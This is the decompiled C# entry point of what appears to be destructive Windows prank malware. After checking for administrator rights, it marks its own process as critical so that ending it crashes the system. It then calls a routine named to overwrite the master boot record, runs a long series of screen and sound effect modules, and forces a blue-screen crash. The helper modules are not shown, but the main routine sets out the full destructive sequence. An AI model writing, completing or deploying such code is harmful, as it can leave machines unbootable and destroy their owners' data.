using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using BOH5;
using BSOD;
using CUBE;
using CUBE2;
using CUBESOLARIS;
using DDT;
using DIAGONALE;
using GDI;
using GDI2;
using GDI4;
using GOCULLINATOR;
using HELL;
using HYDROGEN;
using IDK;
using LSD1;
using LSD2;
using LSDTRIP;
using LST56;
using MANDELBROT;
using MbrOverwriterRANDOM;
using PLASMA;
using PLASMA56;
using sierpesky;
using SOUND;
using TEST4;
using TEST5;
using TEST8;
using TEST89;
using WARNING;
using WINDOWS10O11NO;

// Token: 0x02000002 RID: 2
internal class MainProgram
{
	// Token: 0x06000001 RID: 1
	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern uint NtSetInformationProcess(IntPtr processHandle, int processInformationClass, ref int processInformation, int processInformationLength);

	// Token: 0x06000002 RID: 2 RVA: 0x00002050 File Offset: 0x00000250
	private static void Main(string[] args)
	{
		bool flag = !MainProgram.IsAdministrator();
		if (flag)
		{
			Console.WriteLine("BRO ADMIN.");
		}
		else
		{
			Process currentProcess = Process.GetCurrentProcess();
			IntPtr handle = currentProcess.Handle;
			int num = 1;
			uint num2 = MainProgram.NtSetInformationProcess(handle, 29, ref num, 4);
			bool flag2 = num2 == 0U;
			if (flag2)
			{
				Console.WriteLine("BYE");
			}
			else
			{
				Console.WriteLine("Failed to set process as critical. Status: " + num2.ToString());
			}
			global::WARNING.Program.ShowEffects();
			Class1.OverwriteMBR();
			global::PLASMA56.Program.ShowEffect();
			global::WINDOWS10O11NO.Program.CheckAndForceBSOD();
			global::LSD2.Program.ShowEffect();
			global::GOCULLINATOR.Program.ShowEffect();
			global::CUBESOLARIS.Program.CUBE();
			global::PLASMA.Program.ShowEffect();
			global::DDT.Program.ShowEffect();
			global::sierpesky.Program.ShowEffect();
			global::HYDROGEN.Program.ShowEffect();
			global::BOH5.Program.ShowEffect();
			global::SOUND.Program.ShowEffect();
			global::TEST89.Program.ShowEffects();
			global::TEST4.Program.ShowEffects();
			global::TEST5.Program.ShowEffects();
			global::TEST8.Program.ShowEffects();
			global::IDK.Program.ShowEffect();
			global::HELL.Program.ShowEffect();
			global::GDI.Program.ShowEffect();
			global::GDI4.Program.ShowEffect();
			global::CUBE2.Program.ShowEffect();
			global::CUBE.Program.ShowEffect();
			global::LSD1.Program.ShowEffect();
			global::GDI2.Program.ShowEffect();
			global::DIAGONALE.Program.ShowEffect();
			global::MANDELBROT.Program.ShowEffect();
			global::LSDTRIP.Program.ShowEffect();
			global::LST56.Program.ShowEffect();
			BSODProgram.TriggerBSOD();
		}
	}

	// Token: 0x06000003 RID: 3 RVA: 0x00002180 File Offset: 0x00000380
	private static bool IsAdministrator()
	{
		WindowsIdentity current = WindowsIdentity.GetCurrent();
		WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
		return windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
	}

	// Token: 0x04000001 RID: 1
	private const int ProcessBreakOnTermination = 29;

	// Token: 0x04000002 RID: 2
	private const int BreakOnTerminationFlag = 1;
}
